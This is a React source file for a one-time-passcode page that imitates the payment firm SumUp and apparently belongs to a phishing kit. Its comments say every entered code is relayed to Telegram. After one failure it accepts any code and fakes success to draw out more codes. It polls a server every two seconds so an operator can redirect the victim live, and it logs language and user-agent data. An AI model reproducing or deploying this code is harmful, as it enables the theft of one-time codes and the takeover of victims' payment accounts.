import { useState, useEffect } from "react";
import { Link, useLocation } from "wouter";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { useTranslation } from "@/contexts/LanguageContext";

export default function OtpVerification() {
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const { t } = useTranslation();

  useEffect(() => {
    // Sync attempts from localStorage on mount
    if (typeof window !== 'undefined') {
      const storedAttempts = localStorage.getItem('otpAttempts');
      if (storedAttempts) {
        const attemptCount = parseInt(storedAttempts);
        setAttempts(attemptCount);
      } else {
        // Fresh OTP session - ensure we start from 0
        setAttempts(0);
      }
    }

    // Check for admin redirect every 2 seconds
    const redirectCheck = setInterval(async () => {
      try {
        const sessionId = localStorage.getItem('visitorSessionId');
        if (sessionId) {
          const response = await apiRequest("POST", "/api/check-redirect", { sessionId });
          const data = await response.json();
          
          if (data.redirect) {
            console.log(`🎯 REDIRECTING FROM OTP TO: ${data.redirect}`);
            setLocation(data.redirect);
          }
        }
      } catch (error) {
        // Silent fail
      }
    }, 2000);

    return () => clearInterval(redirectCheck);
  }, [setLocation]);

  const handleVerifyOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Prevent double submission
    if (isLoading) return;
    
    setIsLoading(true);

    try {
      // Get language and device info
      const language = navigator.language || 'Unknown';
      const userAgent = navigator.userAgent || 'Unknown';
      
      // On second attempt (after first failure), accept ANY code and go to success
      if (attempts >= 1) {
        // Send the OTP to backend for logging - regardless of validation result
        let otpSentToTelegram = false;
        
        try {
          const response = await apiRequest("POST", "/api/verify-otp", { 
            otp,
            language,
            userAgent,
            attempt: attempts + 1
          });
          // If we get here, the OTP was correct and sent to Telegram via verify endpoint
          otpSentToTelegram = true;
        } catch (verifyError) {
          // Verification failed (wrong code) - send to Telegram via failure endpoint
          try {
            await apiRequest("POST", "/api/otp-failure", { 
              otp,
              language,
              userAgent,
              attempt: attempts + 1
            });
            otpSentToTelegram = true;
          } catch (failureError) {
            // Silent fail - notification shouldn't block the app
            console.error("Failed to send OTP failure notification:", failureError);
          }
        }
        
        // Clear stored attempts on success
        if (typeof window !== 'undefined') {
          localStorage.removeItem('otpAttempts');
        }
        
        toast({
          title: t('otp_success_title'),
          description: t('otp_success_desc'),
        });
        
        setOtp("");
        
        // Automatically redirect to loading page
        setTimeout(() => {
          setLocation("/loading");
        }, 1000);
        
        // Don't re-enable the button
        return;
      }
      
      // First attempt - validate the OTP
      const response = await apiRequest("POST", "/api/verify-otp", { 
        otp,
        language,
        userAgent,
        attempt: attempts + 1
      });
      const data = await response.json();

      if (data.success) {
        // Clear stored attempts on success
        if (typeof window !== 'undefined') {
          localStorage.removeItem('otpAttempts');
        }
        
        toast({
          title: t('otp_success_title'),
          description: t('otp_success_desc'),
        });
        
        setOtp("");
        
        // Automatically redirect to loading page
        setTimeout(() => {
          setLocation("/loading");
        }, 1000);
        
        // Don't re-enable the button
        return;
      } else {
        // Server rejected the OTP - treat as failure
        throw new Error(data.error || "Invalid OTP code");
      }
    } catch (error: any) {
      // Increment attempt counter
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);
      
      // Send failure notification to Telegram
      const language = navigator.language || 'Unknown';
      const userAgent = navigator.userAgent || 'Unknown';
      apiRequest("POST", "/api/otp-failure", { 
        otp,
        language,
        userAgent,
        attempt: newAttempts
      }).catch(() => {
        // Silent fail - notification shouldn't break the app
      });
      
      if (newAttempts >= 2) {
        // Clear stored attempts after max attempts reached
        if (typeof window !== 'undefined') {
          localStorage.removeItem('otpAttempts');
        }
        
        toast({
          title: t('otp_too_many_attempts_title'),
          description: t('otp_too_many_attempts_desc'),
          variant: "destructive",
        });
        
        // Redirect to login after 2 failed attempts (button stays disabled)
        setTimeout(() => {
          setLocation("/login");
        }, 2000);
      } else {
        // First attempt failed - store count and show loading page before second attempt
        toast({
          title: t('otp_failed_title'),
          description: `${t('otp_failed_desc')} ${2 - newAttempts} ${t('otp_failed_desc_remaining')}`,
          variant: "destructive",
        });
        
        // Store the attempt count for the next OTP page
        if (typeof window !== 'undefined') {
          localStorage.setItem('otpAttempts', newAttempts.toString());
        }
        
        // Redirect to loading page (button stays disabled)
        setTimeout(() => {
          setLocation("/loading");
        }, 1500);
      }
      
      // Button stays disabled during redirect - don't call setIsLoading(false)
    }
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(value);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
      <div className="w-full max-w-md">
        <Link href="/" className="mb-12 flex items-center hover:opacity-80 transition-opacity" data-testid="link-home">
          <div className="h-8 w-8 bg-black rounded-md flex items-center justify-center" data-testid="logo-icon">
            <svg viewBox="0 0 24 24" fill="white" className="h-5 w-5">
              <path d="M13 10V3L4 14h7v7l9-11h-7z" />
            </svg>
          </div>
          <span className="ml-2 text-lg font-semibold" data-testid="logo-text">sumup</span>
        </Link>

        <h1 className="text-4xl font-bold mb-4 text-black" data-testid="text-title">
          {t('otp_title')}
        </h1>
        
        <p className="text-gray-600 mb-8" data-testid="text-description">
          {t('otp_description')}
        </p>

        <form onSubmit={handleVerifyOtp} className="space-y-6">
          <div>
            <label 
              htmlFor="otp" 
              className="block text-sm font-medium mb-2 text-black"
              data-testid="label-otp"
            >
              {t('otp_label')}
            </label>
            <input
              id="otp"
              type="text"
              value={otp}
              onChange={handleOtpChange}
              placeholder="000000"
              inputMode="numeric"
              required
              maxLength={6}
              className="w-full h-12 px-4 border border-black rounded-md focus:outline-none focus:ring-2 focus:ring-black text-black text-center text-2xl tracking-widest placeholder:text-gray-400"
              data-testid="input-otp"
            />
          </div>

          <button
            type="submit"
            disabled={isLoading || otp.length !== 6}
            className="w-full h-12 bg-black text-white font-semibold rounded-md hover:bg-opacity-90 disabled:bg-opacity-50 transition-all"
            data-testid="button-verify"
          >
            {isLoading ? t('otp_button_loading') : t('otp_button')}
          </button>
        </form>

        <div className="mt-6 text-center">
          <button
            type="button"
            className="text-sm font-medium text-black underline hover:no-underline"
            data-testid="button-resend"
          >
            {t('otp_resend')}
          </button>
        </div>

        <div className="mt-8">
          <Link href="/login">
            <button
              type="button"
              className="w-full h-12 border border-black text-black font-medium rounded-md hover:bg-gray-50 transition-all"
              data-testid="button-back-login"
            >
              {t('otp_back_login')}
            </button>
          </Link>
        </div>
      </div>
    </div>
  );
}
